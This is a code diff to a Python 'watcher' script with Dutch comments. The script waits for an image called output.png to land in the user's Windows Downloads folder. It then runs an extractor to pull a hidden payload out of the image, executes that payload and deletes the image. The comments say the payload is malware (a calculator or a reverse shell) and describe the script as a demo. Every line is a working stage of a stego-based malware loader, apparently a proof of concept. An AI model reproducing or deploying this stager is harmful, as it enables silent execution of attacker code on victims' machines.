@@ -4,6 +4,11 @@ import subprocess
 from getpass import getuser
 
 def start_watcher():
+    # Bepaal de map waar dít script (watcher.py) staat
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    extractor_path = os.path.join(base_dir, "extractor.py")
+    payload_output_path = "extracted_payload.py" # De extractor schrijft dit in de huidige map
+
     # 1. Bepaal het pad naar de Windows Downloads map
     username = getuser()
     download_path = f"C:\\Users\\{username}\\Downloads\\output.png"
@@ -15,16 +20,15 @@ def start_watcher():
         if os.path.exists(download_path):
             print("\n[!] Bestand gedetecteerd in Downloads!")
             
-            # 3. Voer de extractor uit op het gedownloade bestand
-            # We gebruiken 'python' om extractor.py aan te roepen
-            print("[*] Bezig met exporteren van payload...")
-            subprocess.run(["python", "Scripts/extractor.py", download_path])
+            # 3. Voer de extractor uit met het volledige pad naar extractor.py
+            print("[*] Bezig met extraheren van payload...")
+            subprocess.run(["python", extractor_path, download_path])
 
             # 4. Voer de extracte payload (het script) uit
-            if os.path.exists("extracted_payload.py"):
+            if os.path.exists(payload_output_path):
                 print("[!] Payload gevonden! Bezig met uitvoeren...")
                 # Hier voeren we de 'malware' (calculator/reverse shell) uit
-                subprocess.Popen(["python", "extracted_payload.py"])
+                subprocess.Popen(["python", payload_output_path])
                 
                 # 5. Opruimen (optioneel, voor de demo is het handig om het te verwijderen)
                 os.remove(download_path)
